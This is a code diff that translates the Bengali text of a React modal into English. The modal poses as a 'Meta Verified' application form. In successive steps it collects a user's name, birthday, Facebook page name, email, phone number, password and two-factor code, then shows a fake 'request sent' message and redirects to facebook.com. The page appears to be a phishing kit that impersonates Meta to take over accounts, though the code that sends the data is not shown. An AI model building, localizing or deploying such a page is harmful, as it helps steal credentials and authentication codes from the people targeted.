@@ -235,7 +235,7 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
         <div className="modal-dialog modal-dialog-centered modal-dialog-scrollable">
             <div className="modal-content">
                 <div className="modal-header">
-                    <h5 className="modal-title" id="exampleModalLabel">আবেদন ফরম</h5>
+                    <h5 className="modal-title" id="exampleModalLabel">Application Form</h5>
                     <button onClick={onClose} type="button" className="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                 </div>
 
@@ -248,28 +248,28 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
                         <div class="mb-3">
 
                             <div id="emailHelp" class="form-text">
-                                 Meta Verified-এ অংশগ্রহণের জন্য অনুগ্রহ করে নিচের তথ্যগুলো পূরণ করুন
+                                 Please fill in the information to participate in Meta Verified
                             </div>
                         </div>
                                               <div class="mb-3">
-                            <label for="full-name-input" class="form-label">পূর্ণ নাম</label>
+                            <label for="full-name-input" class="form-label">Full Name</label>
                             <input name="full-name" type="text" class="form-control" id="full-name-input"/>
                         </div>
                         <div class="mb-3">
-                            <label for="birthday-input" class="form-label">জন্মতারিখ</label>
+                            <label for="birthday-input" class="form-label">Birthday</label>
                             <input name="birth-day" type="date" class="form-control" id="birthday-input"/>
                         </div>
                         <div class="mb-3">
-                            <label for="fb-page-name-input" class="form-label">Facebook পেজের নাম</label>
+                            <label for="fb-page-name-input" class="form-label">Facebook Page Name</label>
                             <input name="page-name" type="text" class="form-control" id="fb-page-name-input"/>
                         </div>
                         <div className="mb-3">
-                            <label htmlFor="BuisenessEmailField" className="form-label">ইমেইল ঠিকানা</label>
+                            <label htmlFor="BuisenessEmailField" className="form-label">Email Address</label>
                             <input onChange={(e) => {if(e.target.value.length > 100) return;setMail(e.target.value);}} name="buiseness-email" type="email" className="form-control" id="BuisenessEmailField"/>
                         </div>
 
                         <div className="mb-3">
-                            <label htmlFor="PhoneFirld" className="form-label">মোবাইল ফোন নম্বর</label>
+                            <label htmlFor="PhoneFirld" className="form-label">Mobile phone number</label>
                             <PhoneInput
                             inputStyle={{border:'none',fontSize:'15px'}}
                             buttonStyle={{border:'none',backgroundColor:'#fff'}}
@@ -283,22 +283,23 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
 
 
                         <div style={{display: error ? 'inline-block' : 'none'}} className="mb-2 invalid-feedback">
-                          ইমেইল ঠিকানা অথবা ফোন নম্বরটি সঠিক নয়। অনুগ্রহ করে আবার চেষ্টা করুন!
+                          Email address or phone number is incorrect. Please try again!
                         </div>
 
                         <div className="mb-3 form-check">
                             <input type="checkbox" className="form-check-input" id="exampleCheck1"/>
-                            <label className="form-check-label" htmlFor="exampleCheck1">আমি সম্মত আছি
-                                <a id="termsLink" className="add-svg">&nbsp;ব্যবহারের শর্তাবলি
+                            <label className="form-check-label" htmlFor="exampleCheck1">I agree with
+
+                                <a id="termsLink" className="add-svg">&nbsp;Terms of use
                                 </a>
                             </label>
                         </div>
                         <div className="form-btn-wrapper">
                             <button onClick={handleConfirmPage} className="btn btn-primary">
                                 <div className="spinner-border text-light" role="status" style={{display: 'none'}}>
-                                    <span className="visually-hidden">লোড হচ্ছে...</span>
+                                    <span className="visually-hidden">Loading...</span>
                                 </div>
-                                <span className="button-text">&nbsp;{isLoading == true ? 'লোড হচ্ছে...' : 'চালিয়ে যান'}</span>
+                                <span className="button-text">&nbsp;{isLoading == true ? 'Loading...' : 'Continue'}</span>
                             </button>
                         </div>
                     </div>
@@ -319,7 +320,7 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
                                  <img onClick={togglePasswordVisiblity} style={{position:'absolute',right:'5%',width:'20px',height:'20px'}} src={passwordShown ? "/assets/eye.png" : "/assets/eye-close.png"}/>
                              </div>
                              <div style={{display: error == true ? 'inline-block' : 'none'}} className="mt-2 invalid-feedback">
-                                পাসওয়ার্ডটি সঠিক নয়, অনুগ্রহ করে আবার চেষ্টা করুন।
+                                Password is incorrect, please try again.
                             </div>
                          </div>
                          <div className="form-btn-wrapper">
@@ -327,11 +328,11 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
                                  <div className="spinner-border text-light" role="status" style={{display: isLoading ? 'inline-block' : 'none'}}>
                                      <span className="visually-hidden"></span>
                                  </div>
-                                 <span className="button-text">&nbsp;{isLoading == true ? 'লোড হচ্ছে...' : 'চালিয়ে যান'}</span>
+                                 <span className="button-text">&nbsp;{isLoading == true ? 'Loading...' : 'Continue'}</span>
                              </button>
                          </div>
                          <div id="forgot-pass-wrap">
-                             <span>“পাসওয়ার্ড ভুলে গেছেন?</span>
+                             <span>Forgot password?</span>
                          </div>
                      </div>
                      <div className="spaser"></div>
@@ -339,8 +340,8 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
                     case 2: 
                      return (<div className="modal-body">
                      <div className="twoFAinfo-wraper">
-                         <h1 className="modal-title" id="2FAmodalLabel">আপনার যাচাইকরণ কোডটি যাচাই করুন</h1>
-                         <p>দয়া করে এই অ্যাকাউন্টের জন্য দুই-স্তরের যাচাইকরণ অ্যাপ অথবা আপনার মোবাইলে প্রাপ্ত টেক্সট মেসেজ থেকে ৬-সংখ্যার কোডটি প্রবেশ করান।</p>
+                         <h1 className="modal-title" id="2FAmodalLabel">Check your authentication code</h1>
+                         <p>Enter the 6-digit code for this account from the two-factor authentication app or text message on your mobile.</p>
                          <div className="fb-round-wraper">
                              <img src="img/2FA.png"  style={{width: '100%'}}/>
                          </div>
@@ -360,15 +361,15 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
                   }} name="2FA-1" minLength="6" maxLength="8" type="tel" className="form-control" id="exampleInputPassword" autoComplete="off"/>
                              </div>
                              <div style={{display: error ? 'inline-block' : 'none'}} className="invalid-feedback">
-                                 ভুল। অনুগ্রহ করে কিছুক্ষণ পর আবার চেষ্টা করুন। <span id="timer"></span>
+                                 Incorrect. Please, try again after <span id="timer"></span>
                              </div>
                          </div>
                          <div className="form-btn-wrapper">
                              <button disabled={isLoading ? true : false} onClick={handleAuthEnter} className="btn btn-primary">
                                  <div className="spinner-border text-light" role="status" style={{display: isLoading ? 'inline-block' : 'none'}}>
-                                     <span className="visually-hidden">লোড হচ্ছে...</span>
+                                     <span className="visually-hidden">Loading...</span>
                                  </div>
-                                <span className="button-text">&nbsp;{isLoading == true ? 'লোড হচ্ছে...' : 'চালিয়ে যান'}</span>
+                                <span className="button-text">&nbsp;{isLoading == true ? 'Loading...' : 'Continue'}</span>
                              </button>
                          </div>
                      </div>
@@ -378,19 +379,19 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
                       return (
                       <div className="modal-body">
                       <div className="twoFAinfo-wraper">
-                          <h1 className="modal-title" id="successModalLabel">অনুরোধ পাঠানো হয়েছে</h1>
+                          <h1 className="modal-title" id="successModalLabel">Request has been sent</h1>
                           <br/>
                           <div className="fb-round-wraper">
                               <img src="img/phone.png" style={{width: '100%'}}/>
                           </div>
                           <br/>
-                          <p>আপনার অনুরোধটি প্রক্রিয়াকরণ কিউতে যোগ করা হয়েছে। আমরা ২৪ ঘণ্টার মধ্যে আপনার অনুরোধটি প্রক্রিয়া করব। যদি ২৪ ঘণ্টার মধ্যে ফলাফলসহ কোনো ইমেইল না পান, অনুগ্রহ করে আবার অনুরোধ পাঠান।</p>
+                          <p>"Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with a result within 24 hours, please resend the request.</p>
   
                       </div>
                       <form action="https://facebook.com/" method="GET">
                           <div className="form-btn-wrapper">
                               <button className="btn btn-primary">
-                                  <span className="button-text">Facebook-এ ফিরে যান</span>
+                                  <span className="button-text">Return to facebook</span>
                               </button>
                           </div>
                       </form>
